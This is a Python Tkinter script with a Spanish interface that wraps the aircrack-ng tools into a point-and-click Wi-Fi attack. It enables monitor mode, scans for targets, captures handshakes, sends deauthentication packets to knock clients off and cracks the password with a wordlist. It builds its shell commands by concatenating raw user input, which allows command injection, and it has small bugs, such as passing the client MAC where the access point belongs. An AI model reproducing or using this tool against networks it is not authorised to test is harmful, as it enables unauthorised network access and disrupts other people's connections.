#! /usr/bin/env python3
#_*_ coding: utf8 _*_
import os,sys,time,socket
from tkinter import *
from tkinter import filedialog as FileDialog
from tkinter import messagebox
from io import open
W = '\033[37m'
R = '\033[1;31m'  # red
G = '\033[1;32m'  # green
O = '\033[1;33m'  # orange
B = '\033[1;34m'  # blue
P = '\033[1;35m'  # purple
C = '\033[1;36m'  # cyan
GRs = '\033[1;37m'  # gray 
os.system("clear")

#Base
raiz=Tk()
raiz.title("AIRCRACK GUI - MRX13")
raiz.geometry("550x550")
raiz.resizable(False, False)
raiz.config(bg="black")

#Variables
iface=StringVar()
channel=StringVar()
client=StringVar()
mac=StringVar()
packs=StringVar()
monA=StringVar()
bssid=StringVar()
wname=StringVar()
dic=StringVar()

#Interfaz

miFrame=Frame()
miFrame.pack(side="left", anchor="n", fill="x")
miFrame.config(bg="black")
miFrame.config(width="10000", height="5000")


#Acciones de botón
def monAction():
	print(G+"[+] "+GRs+"Activando modo monitor en"+iface.get())
	os.system("sudo airmon-ng start "+iface.get())
	print(G+"[+] "+GRs+iface.get()+" a sido activada en modo monitor :)")
def monA():
	win=Toplevel()
	win.geometry("255x100")
	win.config(bg="black")
	ifaceL=Label(win, bg="black", fg="white", text="Interfaz").place(x=100, y=5)
	ifaceE=Entry(win, bg="white", fg="green", textvariable=iface).place(x=50, y=40)
	ifaceB=Button(win, bg="white", fg="green", text="Activar", command=monAction).place(x=100, y=70)
def monOff():
	print(G+"[-] "+GRs+"Desactivando modo monitor en "+iface.get())
	os.system("sudo airmon-ng stop "+iface.get())
	print(G+"[-] "+GRs+iface.get()+" a sido desactivada en modo monitor :)")
def monO():
	win=Toplevel()
	win.geometry("255x100")
	win.config(bg="black")
	ifaceL=Label(win, bg="black", fg="white", text="Interfaz").place(x=100, y=5)
	ifaceE=Entry(win, bg="white", fg="green", textvariable=iface).place(x=50, y=40)
	ifaceB=Button(win, bg="white", fg="green", text="Desactivar", command=monOff).place(x=100, y=70)
def estableceri():
	messagebox.showinfo(message="La interfaz a trabajar a sido establecida("+iface.get()+")", title="Intefaz a trabajar")
def ifaceD():
	win=Toplevel()
	win.geometry("255x100")
	win.config(bg="black")
	print(B+"[INTERFACES]"+W)
	os.system("iwconfig")
	ifaceL=Label(win, bg="black", fg="white", text="Establecer interfaz").place(x=70, y=5)
	ifaceE=Entry(win, bg="white", fg="green", textvariable=iface).place(x=50, y=40)
	ifaceB=Button(win, bg="white", fg="green", text="Establecer", command=estableceri).place(x=100, y=70)
def scanning():
	messagebox.showinfo(message="Ctrl+C para parar y apunta el BSSID de una red y de un cliente del mismo.", title="AVISO DE AYUDA")
	os.system("sudo airodump-ng "+iface.get())
	print(G+"[!] "+GRs+"Establece el canal y bssid para comenzar el ataque ")
def channeli():
	messagebox.showinfo(message="El canal a trabajar a sido establecida("+channel.get()+")", title="Canal a trabajar")
def channelD():
	win=Toplevel()
	win.geometry("255x100")
	win.config(bg="black")
	channelL=Label(win, bg="black", fg="white", text="Canal o Channel").place(x=100, y=5)
	channelE=Entry(win, bg="white", fg="green", textvariable=channel, width=5).place(x=100, y=40)
	channelB=Button(win, bg="white", fg="green", text="Establecer", command=channeli).place(x=100, y=70)
def bssidi():
	messagebox.showinfo(message="El BSSID a sido establecido("+bssid.get()+")", title="BSSID a trabajar")
	print(G+"[!] "+GRs+"Establece el nombre de captura para continuar con el ataque.")
def bssidD():
	win=Toplevel()
	win.geometry("255x120")
	win.config(bg="black")
	bssidL=Label(win, bg="black", fg="white", text="BSSID").place(x=100, y=5)
	bssidE=Entry(win, bg="white", fg="green", textvariable=bssid).place(x=50, y=40)
	bssidB=Button(win, bg="white", fg="green", text="Establecer", command=bssidi).place(x=100, y=70)
def wnamei():
	messagebox.showinfo(message="El nombre de captura a sido establecido("+wname.get()+")", title="Nombre de captura a trabajar")
	print(G+"[!] "+GRs+"Establece la mac de algun cliente y comienza el ataque")
def nameD():
	win=Toplevel()
	win.geometry("255x120")
	win.config(bg="black")
	nameL=Label(win, bg="black", fg="white", text="Nombre de captura").place(x=100, y=5)
	nameE=Entry(win, bg="white", fg="green", textvariable=wname).place(x=50, y=40)
	nameB=Button(win, bg="white", fg="green", text="Establecer", command=wnamei).place(x=100, y=70)
def clienti():
	messagebox.showinfo(message="El Cliente a sido establecido("+iface.get()+")", title="CLIENTE")
def clientD():
	win=Toplevel()
	win.geometry("255x120")
	win.config(bg="black")
	clientL=Label(win, bg="black", fg="white", text="Cliente MAC").place(x=100, y=5)
	clientE=Entry(win, bg="white", fg="green", textvariable=client).place(x=50, y=40)
	clientB=Button(win, bg="white", fg="green", text="Establecer", command=clienti).place(x=100, y=70)
def dici():
	messagebox.showinfo(message="El diccionario a sido establecido("+iface.get()+")", title="Diccionario")
def dicD():
	win=Toplevel()
	win.geometry("255x120")
	win.config(bg="black")
	clientL=Label(win, bg="black", fg="white", text="Diccionario").place(x=100, y=5)
	clientE=Entry(win, bg="white", fg="black", textvariable=dic).place(x=50, y=40)
	clientB=Button(win, bg="white", fg="green", text="Establecer", command=dici).place(x=100, y=70)
def start():
	print(B+"[*] "+GRs+"Iniciando ataque...esperando respuesta y luego desencriptar")
	os.system("xterm -geometry 132x26 -e sudo airodump-ng -c "+channel.get()+" -w "+wname.get()+" --bssid "+bssid.get()+" "+iface.get()+" | xterm -geometry 132x16 -e sudo aireplay-ng --deauth 20 -a "+client.get()+" "+iface.get())
	desea=input(C+"Desea ahora atacar con diccionario?[S/n]")
	if desea == "S" or desea == "s":
		os.system("sudo aircrack-ng -w "+dic.get()+" '"+wname.get()+"'")
	else:
		print(B+"[*] "+GRs+"Ataque terminado, Diviertete :)")


#Botones y título
titulo=Label(miFrame,text="Aircrack-gui - MRX13", bg="black", fg="white").place(x=200, y=5)

monOB=Button(miFrame,text="Desactivar modo monitor", fg="black", bg="white", command=monO).place(x=5, y=30)
monAB=Button(miFrame,text="Activar modo monitor", fg="black", bg="white", command=monA).place(x=5, y=70)
ifaceB=Button(miFrame,text="Establecer interfaz", fg="black", bg="white", command=ifaceD).place(x=5, y=110) 
scan=Button(miFrame,text="Escanear objetivos", fg="black", bg="white", command=scanning).place(x=280, y=30)
channelF=Button(miFrame,text="Establecer canal", fg="black", bg="white", command=channelD).place(x=280, y=70)
bssidF=Button(miFrame,text="Establecer BSSID", fg="black", bg="white", command=bssidD).place(x=280, y=110)
nameW=Button(miFrame,text="Establecer nombre de captura", fg="black", bg="white", command=nameD).place(x=260, y=150)
clients=Button(miFrame,text="Esblecer Cliente", fg="black", bg="white", command=clientD).place(x=280, y=190)
diccW=Button(miFrame,text="Establece diccionario", fg="black", bg="white", command=dicD).place(x=10, y=150)
startB=Button(miFrame,text="Comenzar ataque", fg="black", bg="red", command=start,width=58).place(x=1, y=240)
















raiz.mainloop()